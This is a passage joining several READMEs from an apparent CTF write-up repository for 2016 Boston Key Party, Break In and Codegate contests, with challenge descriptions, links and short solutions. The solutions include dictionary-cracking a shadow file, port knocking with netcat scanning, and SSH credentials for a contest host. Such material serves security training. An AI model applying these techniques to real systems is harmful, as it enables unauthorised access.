* [crypto/more-like-zkp-4](crypto/more-like-zkp-4)

## External write-ups only

* [misc/lily-flac-2](misc/lily-flac-2)
* [pwn/complex-calc-5](pwn/complex-calc-5)
* [pwn/cookbook-6](pwn/cookbook-6)
* [pwn/simple-calc-5](pwn/simple-calc-5)
* [pwn/segsh-6](pwn/segsh-6)
* [pwn/spacerex-8](pwn/spacerex-8)
* [web/bug-bounty-3](web/bug-bounty-3)
* [web/optiproxy-2](web/optiproxy-2)
* [web/good-morning-3](web/good-morning-3)
* [crypto/ltseorg-4](crypto/ltseorg-4)
* [crypto/des-ofb-2](crypto/des-ofb-2)
* [crypto/hamc_crc-5](crypto/hamc_crc-5)
* [crypto/bobs-hat-4](crypto/bobs-hat-4)
* [reversing/unholy-4](reversing/unholy-4)
* [reversing/frog-fraction-2-5](reversing/frog-fraction-2-5)
* [reversing/jit-in-my-pants-3](reversing/jit-in-my-pants-3)

## Missing write-ups

* [crypto/gsilvis-counting-magic-9](crypto/gsilvis-counting-magic-9)
# Boston Key Party CTF : frog-fraction-2-5

**Category:** Reversing
**Points:** 5
**Solves:** 63
**Description:**

> Turns out Frog Fractions 2 is not battletoads  
> 
> 
> NOTE: key in different format flag is md5 of the key (incl newline at the end, sorry for crazy flag format), with BKPCTF{} around it, eg BKPCTF{764efa883dda1e11db47671c4a3bbd9e}


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/re_5_Frog_Fractions_2> 
* <https://github.com/ByteBandits/writeups/tree/master/bostonkeyparty-2016/reverse/Alewife/sudhackar>
* <http://gmiru.com/writeups/bkp-frog>
# Boston Key Party CTF : jit-in-my-pants-3

**Category:** Reversing
**Points:** 3
**Solves:** 38
**Description:**

>Because reversing an obfuscated jit'ed virtual machine for 3 points is fun!  


## Write-up

(TODO)

## Other write-ups and resources

* Challenge author's expected Solution <https://dustri.org/b/expected-solution-for-jit-in-my-pants-boston-key-party-2016.html>
* <https://www.xil.se/post/bkp-2016-jit-re-kbeckmann/>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/re_3_Jit_in_my_pants>
# Boston Key Party CTF : unholy-4

**Category:** Reversing
**Points:** 4
**Solves:** 61
**Description:**

> python or ruby? why not both!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/reversing/unholy>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/re_4_unholy>
* <http://poning.me/2016/03/10/unholy/>
* [Russian](https://github.com/unamer/ctf/blob/master/bkpctf2016/simplecalc.py)
# Boston Key Party CTF : bug-bounty-3

**Category:** Web
**Points:** 3
**Solves:** 45
**Description:**

> grill the web! <http://52.87.183.104:5000/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88733/?langid=1> 
* <https://0day.work/boston-key-party-ctf-2016-writeups/#bugbounty>
* <http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html>
* <https://github.com/stypr/ctf/tree/master/2016/bkp_2016>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/web_3_Bug_Bounty>
# Boston Key Party CTF : good-morning-3

**Category:** Web
**Points:** 3
**Solves:** 110
**Description:**

> <http://52.86.232.163:32800/> 


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88732/?langid=1> 
* <https://0day.work/boston-key-party-ctf-2016-writeups/#goodmorning>
* <http://www.kernelpicnic.net/2016/03/06/BKPCTF-Wonderland-Good-Morning-Write-Up.html>
* <https://github.com/stypr/ctf/tree/master/2016/bkp_2016>
* <http://security.szurek.pl/boston-key-party-ctf-2016-good-morning-and-optiproxy-writeup.html>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/web_3_Good_Morning>
# Boston Key Party CTF : optiproxy-2

**Category:** Web
**Points:** 2
**Solves:** 115
**Description:**

> inlining proxy here <http://optiproxy.bostonkey.party:5300>


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88734/?langid=1> 
* <https://eugenekolo.com/blog/boston-key-party/#optiproxy>
* <https://0day.work/boston-key-party-ctf-2016-writeups/#optiproxy>
* <https://github.com/stypr/ctf/tree/master/2016/bkp_2016>
* <http://security.szurek.pl/boston-key-party-ctf-2016-good-morning-and-optiproxy-writeup.html>
# Break In 2016 - Crypto-Numbero

**Category:** Crypto
**Points:** 100
**Solves:** 7
**Description:**

> 249929761157732020161556121009125440871694502549075144988219699324612968709313502340276966732128645621282888705508840858566948023130606222964801977446316823159281256329353559220858509063084671505269932006162189731434947807072043095879259154468002856960

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

In this question the number given was a double type. So all one had to do 
was to understand this part and after that it was just scanning and printing 
the number. 

Starting approach could be to read the number and then convert it to string 
byte by byte but that would lead to some garbage chars at the end and that's 
when one has to figure out that the number is larger than an integer. So now 
try out some other data types of larger size than int.

Here's the code for how this number was created:

249929761157732020161556121009125440871694502549075144988219699324612968709313502340276966732128645621282888705508840858566948023130606222964801977446316823159281256329353559220858509063084671505269932006162189731434947807072043095879259154468002856960

    /********** strtodouble.c ********************/
    #include<stdio.h>    
    int main() {
        double d[8];
        scanf("%s", d); 
        printf("%lf\n", d[0]);
        return 0;
    }

After the string was converted to double, the decimal part was removed to 
increase the difficulty by broadning the field in which number could 
lie. Also removing the decimal part had no effect on the string.


And here's the code to read the number and then print it in string:

    /********** doubletostr.c ********************/
    #include<stdio.h>    
    int main() {
        double x;
        scanf("%lf", &x);
        puts(&x);
        printf("\n%s\n",&x);
        return 0;
    }

On running the number via this you get

    y0ug0t!t

Which is the flag.

## Other write-ups and resources

* none yet
# Break In 2016 - Find The Idiot

**Category:** Forensics
**Points:** 100
**Solves:** 90
**Description:**

> Your friend Bob, is an expert penetration tester. 
>
> He loves solving and creating puzzles. 
>
> He is invited by Pied Diaper Inc. for some testing. 
>
> You join him for this technical expedition.  At the site, you watch 
>
> him work for a few minutes, when he exclaims, "What an idiot!". Then,
>
> he looks at you with a with a playful gaze. 
>
> Then, handing out a flash drive to you he says, "Find the idiotic user".
>
> Link: [Here](find-the-idiot.zip)

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

This is a straight forward question. You are given a zip file containing the
entire filesystem dumps for the users. You have to run a dictionary attack on the
shadow file.

The attack reveals that user `gohan` has password `dragon1`. 

The flag is `dragon1`.

## Other write-ups and resources

* <https://github.com/objEEdump/breakin/tree/master/find_the_idiot>
# Break In 2016 - Bots are Awesome!

**Category:** golang, irc, git
**Points:** 100
**Solves:** 38
**Description:**

> Aren't they awesome ! 

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The bot in question was on the IRC channel. The bot was an instance 
of goircbot named teehee bot. The bot would respond to all queries of 
the form

    !teeheeBreakIn query

For getting the flag, a recon had to be made on the bot. The bot replied 
to `!teeheeBreakin about` and `!teeheeBreakin help` among other commands 
which would show the github page for goircbot.

The source code had a `breakin` branch with the following lines in the source
code

        bot.WriteMessage("This is where all the magic happens ;)", name[0])
    } else if flags[1] == "breakInEnter" {
    } else {
        bot.WriteMessage("I didn't get that, try '!teehee help' ??", name[0])
    }

This leads to the final solution

    !teeheeBreakIn breakInEnter

On giving the bot this command the bot replies with 

    sugarHowDoYouGetSoFlyyy

Which is the flag.

## Other write-ups and resources

* <https://github.com/objEEdump/breakin/tree/master/bots_are_awesome>
# Break In 2016 - Ethernet Patched Transmission

**Category:** Networking
**Points:** 200
**Author:** networ-k-ing
**Solves:** 6
**Description:**

> Seems like someone intercepted and altered the frames. Can you patch it?
>     
>     >>Ingress>>
>     0x0000: 35 02 d2 d2 d2 d2 64 c4 14 74 02 94 08 00 45 00
>     0x0010: 00 3c a6 65 40 00 3e 06 75 a5 45 75 14 25 e3 02
>     0x0020: e4 14 dd c4 1f 90 00 00 00 00 00 00 00 00 a0 02
>     0x0030: 38 90 c7 d0 00 00 02 04 05 b4 04 02 08 0a e4 14
>     0x0040: 45 84 00 00 00 00 01 03 03 07
>     
>     >>Ingress>>
>     0x0000: 36 03 d3 d4 d5 d6 65 c1 13 72 02 94 08 00 45 00
>     0x0010: 00 3c a6 65 40 00 3e 06 07 29 31 43 19 43 21 44
>     0x0020: 23 64 dd c4 1f 90 00 00 00 00 00 00 00 00 a0 02
>     0x0030: 38 90 59 54 00 00 02 04 05 b4 04 02 08 0a e4 14
>     0x0040: 45 84 00 00 00 00 01 03 03 07
>     
>     >>Ingress>>
>     0x0000: a4 3b 45 cd 1d 76 56 22 75 15 02 41 08 00 45 00
>     0x0010: 00 3c a6 65 40 00 3e 06 54 e8 32 45 66 14 65 34
>     0x0020: 43 e1 dd c4 1f 90 00 00 00 00 00 00 00 00 a0 02
>     0x0030: 38 90 b0 ff 00 00 02 04 05 b4 04 02 08 0a e4 14
>     0x0040: 45 84 00 00 00 00 01 03 03 07
>     
>     <<Egress<<
>     0x0000:  ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 08 00 45 00
>     0x0010:  00 3c 00 00 40 00 3e 06 1c 0b ?? ?? ?? ?? ?? ??
>     0x0020:  ?? ?? 1f 90 dd c4 00 00 00 00 00 00 00 01 a0 ??
>     0x0030:  38 90 18 79 00 00 02 04 05 b4 04 02 08 0a 53 e3
>     0x0040:  8e e8 ?? ?? ?? ?? 01 03 03 07

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

In this question 4 packets were given initially out of which one 
packet had some hex bytes missing. So the first step should be to 
decode/analyse the given packets in a packet decoder/analyser like 
wireshark. After analyzing the packet in wireshark one can see that 
the given ingress (input) packets were tcp syn packets, so now by 
common sense the egress (output) packet, which had missing bytes, 
should be a syn/ack packet. Even if someone had doubts regarding 
the protocol of the egress packet, they could have always used 
the checksum to guess the reply flag and also there were many other 
hints to find the reply type.

So, now we can begin filling up the missing bytes in the egress packet. 
We already covered one of the missing byte.

    0x12 for syn/ack

Moving on to other missing bytes, we can see that the TSECR i.e. Timestamp Echo Reply 
field also had some missing bytes, so the next thing to fill up could be 
this section. Here we had to use the TSVAL field of the recieved syn packets, 
so this field gave us 4 more missing bytes:

    e4 14 45 84

since every ingress packet had same TSVAL value. Finally the only fields missing were source
and destination mac and ip addresses. Now this was the part where we have to use the src 
and dest mac and ip-addrs of the given packets one by one and then figure out the correct one by  
using the ip-checksum. If someone used the given order of packets, they would have gotten 
the correct answer after their first check itself i.e. the mac and ip-addrs of the first 
ingress packet were the correct combination for the reply.

So, the missing bytes were:

    64 c4 14 74 02 94 35 02 d2 d2 d2 d2 e3 02 e4 14 45 75 14 25 12 e4 14 45 84

And if someone observed carefully enough then they would have understood that the above bytes are reverse hex representation of ascii chars.
So we reverse every char:

    46 4c 41 47 20 49 53 20 2d 2d 2d 2d 3e 20 4e 41 54 57 41 52 21 4e 41 54 48  

which was:

    FLAG IS ----> NATWAR!NATH

Hence Flag is `NATWAR!NATH`

Packet syntax:

    [(00 07 0e 64 f9 3f) dest-mac-addr (d4 c9 ef 66 da f2) src-mac-addr (08 00) type-ip] ETH-2_LAYER 
    [45 00 00 (Type of Service-TOS) 3c (a6 65) identification 40 00 (40) TTL (06) protocol_tcp (4a 23) header-checksum (0a 01 21 c8) src-ipv4 (0a 04 14 67) dest-ipv4 ]IP_LAYER 
    [(ad 2c) src-port (1f 90) dest-port (ca 72 ea 9d) seq-no (00 00 00 00) ack-no a0 (02) tcp-flags (syn in this case) (72 10) window_size (bb 90) checksum (00 00) urgent-pointer (02 04 05 b4 04 02 08 (kind-timestamp) 0a (length-10) (01 66 4c f8) TSval (00 00 00 00) TSecr 01 03 03 07) options] TCP_LAYER

## Other write-ups and resources

* none yet
# Break In 2016 - Knock Knock

**Category:** Networking
**Points:** 200
**Author:** Parth Kolekar (aka SprinkleberryMuffin)
**Solves:** 5
**Description:**

> Find the flag.
>
>     <script>
>       setTimeout(function(){
>         $.ajax({
>           'url' : '',
>             success: function(){ window.location = '' },
>             headers: {Connection: 'close'},
>         });
>       }, 10000);
>     </script>
>
>
> Note: port-scanning is permitted for this question.
>
> Note: Sending heavy load with intent to crash server is not.
>
> Note: The Mail Server is not involved with this contest. 
>
> Hint: Like the base, it DROP
>
> Hint: A key port involved with this question is 1XXX.

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The solution of this is to send a tcp packet to port 1143. This changes
the state of the web-server, and then you send a request to 
    
     https://felicity.iiit.ac.in:80/da3fcd1c-dee7-4c27-8523-82db5a4e1c8f

This prints out 
    
     flag: 7cc4c7e83e122b5f67d17585628f182f95b41581

Which is our flag.

## Extended Write-up

A little background on the server setup has to be given for this question.
The way that Felicity handles request is by a main [haproxy](http://www.haproxy.org/) load
balancer which forwards requests to internal nodes which are [lxc](https://linuxcontainers.org/) containers.

The main haproxy node is nicknamed `Yui`, all prefixed by `/contest` are sent to a contest portal
node nicknamed `Taiga`. This is a [nginx](http://nginx.org/) server. The main website is handled 
on a node nicknamed `Kurumi`. Kurumi is a [apache](http://httpd.apache.org/) server. 

The workflow is something like this 

    http://Yui:80/request -> Location: https://felicity.iiit.ac.in/request via haproxy
    https://Yui:443/contest -> http://Taiga:80/contest via haproxy
    https://Yui:443/default_url -> http://Kurumi:80/default_url via haproxy

    http://Taiga:80/contest -> contest data via nginx

    http://Kurumi:80/request -> main website data via apache

For this question a new node was introduced nicknamed `Mio`. This node had a ngnix server and 
[sslh](http://www.rutschle.net/tech/sslh.shtml) daemon which does the following.

    http://Mio:80/request -> http://Mio:8080/request via sslh
    http://Mio:8080/request -> Location: https://felicity.iiit.ac.in/request + X-Too-Insecure "Request Too Insecure" via nginx

    https://Mio:443/contest/breakin/question/1/1/ -> question data via nginx + X-Too-Secure "Request Too Secure"
    https://Mio:443/contest -> http://Taiga:80/contest via nginx +  X-Too-Secure "Request Too Secure"
    https://Mio:443/default_url -> http://Kurumi:80/default_url via nginx + X-Too-Secure "Request Too Secure"

    https://Mio:80/request -> https://Mio:8443/request via sslh
    https://Mio:8443/da3fcd1c-dee7-4c27-8523-82db5a4e1c8f -> flag data via nginx + X-Just-Right "https://felicity.iiit.ac.in:80/da3fcd1c-dee7-4c27-8523-82db5a4e1c8f"
    https://Mio:8443/contest -> http://Taiga:80/contest via nginx + X-Just-Right "https://felicity.iiit.ac.in:80/da3fcd1c-dee7-4c27-8523-82db5a4e1c8f"
    https://Mio:8443/default_url -> http://Kurumi:80/default_url via nginx + X-Just-Right "https://felicity.iiit.ac.in:80/da3fcd1c-dee7-4c27-8523-82db5a4e1c8f"
    
The node `Mio` is injected in the main workflow via iptables in Yui.
The iptables in Yui were set as follows. These are not the exact rules but provide an 
accurate enough representation

    *nat
    -A PREROUTING -m recent -m tcp -p tcp --dport 80 --rcheck --name FWPRT --rcheck --seconds 30 -j DNAT --to-destination Mio:80
    -A PREROUTING -m recent -m tcp -p tcp --dport 443 --rcheck --name FWPRT --rcheck --seconds 30 -j DNAT --to-destination Mio:443
    -A POSTROUTING -S Mio -j MASQUERADE

    *filter
    -A INPUT -m recent -m tcp -p tcp --name FWPRT --remove 
    -A INPUT -m recent -m tcp -p tcp --dport 1143 --name FWPRT --set -j DROP
    ...
    ... Doing what needs to be done in the felicity server
    ...
    -A INPUT -m tcp -p tcp -j REJECT --reject-with icmp-host-unreachable
    -A INPUT -m recent -p icmp --rcheck --name FWPRT -j REJECT --reject-with icmp-host-unreachable
    -A INPUT -p icmp -j REJECT --reject-with icmp-admin-prohabited

These are simple rules and in essence do the following

    Yui:80 -> if FWPRT then Mio:80 else Yui:80
    Yui:443 -> if FWPRT then Mio:443 else Yui:80
    Yui:1143 -> name set FWPRT + DROP packet
    Yui:default_port -> name unset FWPRT + REJECT with icmp-host-unreachable

    Yui(icmp) -> if FWPRT then REJECT with icmp-host-unreachable else icmp-admin-prohabited

The interesting points to note here are 

* On sending a tcp packet to 1143, the 80, 443 ports are transparently forwarded over to Mio.
* All tcp packets sent to any non important port result in this forwarding to go away.
* Once your time limit of 30s expires, the packet allowed to enter the filter chain which unsets name.
* Mio handles the requests identical to the workflow, so inserting it in the middle of the workflow has little to no visible effect.
* If you have set the FWPRT, then the requests come with a TTL of (TTL - 1) because of the extra hop.
* Instead of the sane tcp-rst which would allow a port scan to be completed quickly, we opted for icmp-host-unreachable. This marks all ports as filtered in nmap.

The icmp rules were simply added. There was no real importance of it in the question. The reject with icmp-host-unreachable makes [nmap](https://nmap.org/) 
slow. So slow that watching the nmap complete gave a time of 2hr to complete from my local network. A loop telnet, or netcat request over all ports works
much better and allows for the port scanning to be over in minutes if not seconds. As given in the hint, it *DROP*s the packets. 

The hidden message on the question (script) is to refresh the page repeatedly and attempt to break the keep-alive connection that exists
already. When you figure the hidden port 1143, and send it a packet, (which it drops), we hoped that the page refresh would kick in automatically and 
display the change in your page. In either case, it is a hint that the http server in involved in the contest, especially when adding this script 
makes a miserable job of being able to report comments on the contest page, since it reloads the page every 10 seconds. It was expected that people will 
keep this in mind when scanning for other ports, (since port knocking is usually on 3 ports). 

The [question data](question_data.html) shows "On the right path, you are". And this shows up as a result of sending a request to Mio:443 on the contest 
page url. (Which we hoped would happen automatically, if you kept a browser open on the contest page.). Even if this was not apparent, another hint was added
during the contest.

    After you get the Key Port, use your head.

This should make it very clear that you have to send a http/https request and check the headers which are sent back.

As noted above, the headers added are X-Too-Secure on https request to port 443, and X-Too-Insecure on http request on port 80. 
This is a play on words that suggest that you have to make a 'secure' request on 'insecure' port. 

Sending a https request on 80 reveals the header X-Just-Right with the correct url to get. This reveals the flag.

During performing these http,https requests it may be that your 30 seconds are up, and all the headers simply dissapear,
it was expected that you would repeat the tcp packet on port 1143 and get the forwarding back with yourself.

# Other write-ups and resources

* none yet
# breakin-ctf write-ups

* <https://felicity.iiit.ac.in/threads/breakin/>
* [Scoreboard](https://felicity.iiit.ac.in/threads/breakin/) or [local alternative](scoreboard)

## Completed write-ups

* [crypto/crypto-numbero-100](crypto/crypto-numbero-100)
* [forensics/find-the-idiot-100](forensics/find-the-idiot-100)
* [misc/bot-are-awesome-100](misc/bot-are-awesome-100)
* [networking/ethernet-patched-transmission-200](networking/ethernet-patched-transmission-200)
* [networking/knock-knock-200](networking/knock-knock-200)
* [steganography/eighth-circles-of-hell-200](steganography/eighth-circles-of-hell-200)
* [steganography/make-pair-200](steganography/make-pair-200)
* [steganography/three-thieves-threw-thrumpets-through-trees-100](steganography/three-thieves-threw-thrumpets-through-trees-100)
* [steganography/you-cant-see-me-100](steganography/you-cant-see-me-100)
* [web/go-to-the-scoreboard-20](web/go-to-the-scoreboard-20)
* [web/i-have-the-power-100](web/i-have-the-power-100)
* [web/oops-50](web/oops-50)

## External write-ups only

* none yet

## Missing write-ups# Break In 2016 - Eighth Circles of Hell

**Category:** Steganography
**Points:** 200
**Solves:** 17
**Description:**

> It’s Star Wars time again, and you found a hidden message from R2D2, it 
> supposedly can be decrypted of the Dark Force, help the Resistance to decode 
> the message.
> 
> ![Attached Image](eighthcircleofhell.png)

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The title has a hint towards the content of the strange image attached. 
Eight Circles of Hell is the name given to Malbolge after its crazy twisted
syntax, preventing all but the most dedicated to write code in it. 

And indeed I would be suripised if I find any real program written in malbolge
which does something non trivial. 

The image is actually a code written in another esoteric language piet.

On passing the via a piet intepreter, we get the following output.

     RCdgJHFwIkp9fXtGeXk2L2V0MmJOTkwnLGwqaignZ2dle0FjP2A8eykoeHdZb3Rzcmsxb1FQbGtkKilKSWVkY2JbIUJYV1ZbWlN3V1ZVN1NSS29JSGxGLkpDQkdAZERDQiQjPzhcNnw6MzJWNjU0MzIxKnAoTG0lSSMiJ34lJHtBYn59dnV0OnhxWXV0bTNUcGluZ2xrZCpoZ2BIXiRiRFpfXl1WelRTWFdWVU5yTFFKT05NTEVEaEJBZShEQ0JBOl44PTw7NDkyVjA1LjMyK08vKC0sKyojRyEmfSR7ekB+d197enM5WnZvdG0zcXBvbm1mTitpS2dmZV4kXFtaWV5XXFV5U1hRdVVUU0xLbzJOR0ZqLUlIR0BkPkM8YCM/OFw8NXszVzc2djQzLCtPL28nLCskI0cnJmZlI3p5eD5fe3R5cjhZdW40bGtwaWguT2tkY2IoYGVeY1xbIUJeV1ZVeVlYOlBPVE1xUTMySEdMS0RoSCpGRT5iJUE6Pzg3Wzs0M1c3dzUuUixyMC8uLSwlSWooJ35EfHt6eT9gX3t0eXJ3cDZuc3JxcGkvbWxlamloZ2ZfXl0jYWBCQV1cW1R4WFdWOE5TUktKbjFNTEtKQ2dBRkVEPWEkOj8+PTw1NFg4eDYvU3RzMTApTS0sbGsjRycmJXxkInk/YF91dHM5d3ZYdG1sazFvbm1sZU0qdQ==

Clearly this is a base64 encoded string, so we decode it to get this
        
    D'`$qp"J}}{Fyy6/et2bNNL',l*j('gge{Ac?`<{)(xwYotsrk1oQPlkd*)JIedcb[!BXWV[ZSwWVU7SRKoIHlF.JCBG@dDCB$#?8\6|:32V654321*p(Lm%I#"'~%${Ab~}vut:xqYutm3Tpinglkd*hg`H^$bDZ_^]VzTSXWVUNrLQJONMLEDhBAe(DCBA:^8=<;492V05.32+O/(-,+*#G!&}${z@~w_{zs9Zvotm3qponmfN+iKgfe^$\[ZY^W\UySXQuUTSLKo2NGFj-IHG@d>C<`#?8\<5{3W76v43,+O/o',+$#G'&fe#zyx>_{tyr8Yun4lkpih.Okdcb(`e^c\[!B^WVUyYX:POTMqQ32HGLKDhH*FE>b%A:?87[;43W7w5.R,r0/.-,%Ij('~D|{zy?`_{tyrwp6nsrqpi/mlejihgf_^]#a`BA]\[TxXWV8NSRKJn1MLKJCgAFED=a$:?>=<54X8x6/Sts10)M-,lk#G'&%|d"y?`_uts9wvXtmlk1onmleM*u

This is malbolge.

We now pass it via a Malbolge intepreter.

    Good work finding this shit. Your flag is dafuck_how_did_you_find_this!

The flag is `dafuck_how_did_you_find_this!`

## Other write-ups and resources

* <https://takt0rs.wordpress.com/2016/01/25/break-in-2106-eighth-circle-of-hell/>
# Break In 2016 - make_pair

**Category:** Steganography
**Points:** 200
**Solves:** 5
**Description:**

> If you add the rainbow and get a couple, then you are good to go else you need one more.
> 
> ![Attached Image](image.png)

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

As the question suggests, if you add the rainbow (R, G, B components of the image), and you 
get a couple (even pairity), then you are good to go, else you need one more (mark it odd pairity).

If you perform a pairity check over all the elements of this image, you will end up with a 3d vector
of even and odd pairities.

Print this out as an image, mapping both in different colors. You end up with the following image

![Attached Image](shaktimaan.jpg)

This image is compressed for space. You can extract the orginal from the source image.

The flag is `shaktimaan`

## Other write-ups and resources

* none yet
# Break In 2016 - Three Thieves Threw Trumpets Through Trees

**Category:** Steganography
**Points:** 100
**Solves:** 70
**Description:**

> Link: [Here](image1.jpg)

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The question contains a link to an `image` which is not an image at all.
`file` command show that it is actually a wav file. 

The audio needs to be reversed and slowed down. You can then hear the 
Felicity Co-ordinator Vivek saying "the password is abracadabra". 

The password goes in reference to the Felicity '16 theme "Where magic happens".

The title is a tongue twister and hints that the content is audio. 

## Other write-ups and resources

* <http://h4ckx0re-ctf-crew.co.nf/2016/01/27/break-in-2016-ctf-three-thieves-threw-trumpets-through-trees-100-pts/>
* <https://github.com/objEEdump/breakin/tree/master/three_thieves>
# Break In 2016 - You Can(t) See Me

**Category:** Steganography
**Points:** 100
**Solves:** 80
**Description:**

> On the wonderland of britannia, there are two kinds of dragons Red and Black.
> Master Zero is the commander of blacks and all the black dragons support him. 
> The Red dragons' leader Amiya thinks that the Reds are the best among dragons and blacks are nothing but useless.
> So they want to teach a lesson to black dragons. They encoded a message in 
> this image and sent it to them asking them to decode it. Can they see the message?
>
> ![Attached Image](color.png)

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The image of is 7 x 200 pixels. This is a hint to show that it mst be an ascii text where
each pixel is actually a bit of the 8-bit ascii. 

The red is a binary 1 and the black is a binary 0.

On reading this, we get a text 

    3xXKkFstTUpsG2IFDirE6xDrcAF8DSx4iWxd5f9IQ9T205izN8lS2MQUlsF11gT4TFXHHlLHVHprNTtrh6lURfdUW7Lpuzgu1VKzwb1bg1oq6Ae3GnykkLZZsnze3HVLxHlfCYtzyrcV2Oxp0Gb0Z2ELphR4Oxo7TyvHCuWKWlN8t8KIfHysZK7jBNPu6wRVEUPIwVra

This is the flag.

## Other write-ups and resources

* <https://github.com/objEEdump/breakin/tree/master/you_cant_see_me>
# Break In 2016 - Go To The Scoreboard

**Category:** Web
**Points:** 20
**Solves:** 127
**Description:**

> If you aren't on the Score Board this question is for you! :D

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The question had a html comment in the source of the page

    <!-- the flag is #breakin -->

Enter the flag, and you are good to go. 

## Other write-ups and resources

* none yet
# Break In 2016 - I have the power

**Category:** Web
**Points:** 100
**Solves:** 30
**Description:**

> Go to the right places and don't make any mistakes.
>
> (Right Places is a link to the contest page)

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The request handler source code (in python) is as follows

    def is_power2(num):
        return num != 0 and ((num & (num - 1)) == 0)

    def challenges(request, param):
        FLAG = 'Flag: TriColour'
        if 'seq_count' not in request.session:
            request.session['seq_count'] = []
        elif request.session['seq_count'] == 'Done':
            return HttpResponse(FLAG)
        if len(request.session['seq_count']) > 9:
            request.session['seq_count'] = 'Done';
            return HttpResponse(FLAG)
        try:
            l = request.session['seq_count']
            i = int(param)
            if is_power2(i):
                if i not in l:
                    l.append(i)
                    request.session['seq_count'] = l 
                    return HttpResponse("+1, " + str(len(l)))
                else:
                    return HttpResponse("+0, " + str(len(l)))
        except ValueError:
            pass
        request.session['seq_count'] = []
        return HttpResponse("+0, 0")

Reading the source it is obvious what you have to do to get the flag.
You have to make a request having a param having a value which is a 
power of two. 

On making a request with param not a power of two, the id resets. 
The link in the question statement was a request to this controller with 
the parameter 1.

This is shown by the output 

    +0, 0

If you have entered a number which is a power of 2, then the response is 
either 

    +1, <number of power of 2 entered>

if the number has not been given already or 

    +0, <number of power of 2 entered>

if the number given is already given.

On giving any 9 numbers, the flag is unlocked and the session is edited to
always give you the flag.

## Other write-ups and resources

* none yet
# Break In 2016 - Oops

**Category:** Web
**Points:** 50
**Solves:** 35
**Description:**

>     <style></style> (this line is escaped)
>     <script src="https://felicity.iiit.ac.in/contest/breakin/static/jquery.min.js"></script>

## Write-up

by [ParthKolekar](https://github.com/ParthKolekar)

The content of the attached jquery.min.js has a line attached to it in the bottom. 
This line does 
    
    var content=ajax.fetchPage("http://example.com").toDOM();content.querySelector("h1").parentNode.childNodes[3].innerHTML.split(" ").slice(26).join(" ");

This is a straight forward question to open http://example.com nad the do split, slice and join operations on it's text. 

The related line on http://example.com was 

    This domain is established to be used for illustrative examples in documents. You may use this domain in examples without prior coordination or asking for permission.

On applying the split, slice, and join we end up with 

    asking for permission.

Which is the flag.

## Other write-ups and resources

* <https://github.com/objEEdump/breakin/tree/master/oops>
# Codegate CTF 2016 : cemu-512

**Category:** Misc
**Points:** 
**Solves:** 
**Description:**

> Welcome to MATRIX
> 
> 
> nc 175.119.158.136 31337
> 
> 
> nc 175.119.158.132 31337


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.in/2016/03/codegate-ctf-2016-cemu-512.html> 
# Codegate CTF 2016 : eocnd-274

**Category:** Misc
**Points:** 
**Solves:** 
**Description:**

> eocnd (misc/274)
> 
> You can choose anyone!
> 
> Find flag (Flag format : alphanumeric lowercase, no space, English )
> 
> 
> <https://goo.gl/9DprxG>
> 
> <https://goo.gl/eAgVgc>
> 
> <https://goo.gl/TQm1il>
> 
> <https://goo.gl/z2hwF4>
> 
> <https://goo.gl/SzrkKM>
> 
> <https://goo.gl/4oOR7i>
> 
> <https://goo.gl/Nf8rhv>
> 
> <https://goo.gl/1H4QL2>
> 
> <https://goo.gl/63aQzN>
> 
> <https://goo.gl/217dMb>
> 
> <https://goo.gl/kYg4BT>
> 
> <https://goo.gl/j4p3iK>
> 
> <http://m.wargame.kr/[eocnd.7z](./eocnd.7z)>


## Write-up

(TODO)

## Other write-ups and resources

* <https://zzoru.com/wordpress/?p=15> 
# Codegate CTF 2016 : BugBug-220

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> How lucky I am to have something that makes saying goodbye so hard.
> 
> -winnie the pooh
> 
> 
> nc 175.119.158.135 8909
> 


## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2016/03/16/163631> 
# Codegate CTF 2016 : Fl0ppy-315

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> Fl0ppy (pwnable/315)
> 
> I have 23 floppy disks for redhat 5.2!
> 
> 
> nc 175.119.158.134 5559
> 
> <http://codegate.bpsec.co.kr/static/files/[df289f07e95e7108eccd8e498fd48980](./df289f07e95e7108eccd8e498fd48980)>


## Write-up

(TODO)

## Other write-ups and resources

* <http://revers3r.tistory.com/367> 
* <http://pwnexpoit.hol.es/2016/03/15/codegate-ctf-2015-fl0ppy/>
# Codegate CTF 2016 : manager-287

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> nc 175.119.158.132 22222
> 
> <http://codegate.bpsec.co.kr/static/files/[a5afefd29d5dc067ed6507d78853c691](./a5afefd29d5dc067ed6507d78853c691)>
> 
> 


## Write-up

(TODO)

## Other write-ups and resources

* <https://zzoru.com/wordpress/?p=35> 
# Codegate CTF 2016 : miccheck-1

**Category:** Pwn
**Points:** 
**Solves:** 
**Description:**

> Who's in here?
> 
> 
> ssh mic@175.119.158.131 -p11133
> 
> pw : miccheck
> 


## Write-up

